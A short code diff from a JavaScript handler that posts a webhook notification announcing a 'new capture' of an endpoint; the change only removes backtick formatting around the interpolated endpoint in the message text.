@@ -58,7 +58,7 @@ module.exports = async function handler(req, res) {
   };
 
   const payload = {
-    content: `🚨 @everyone NUEVA CAPTURA: ``${endpoint}`` 🚨`,
+    content: `🚨 @everyone NUEVA CAPTURA: ${endpoint} 🚨`,
     allowed_mentions: { parse: ["everyone"] },
     username: "Public Logger",
     embeds: [embed]
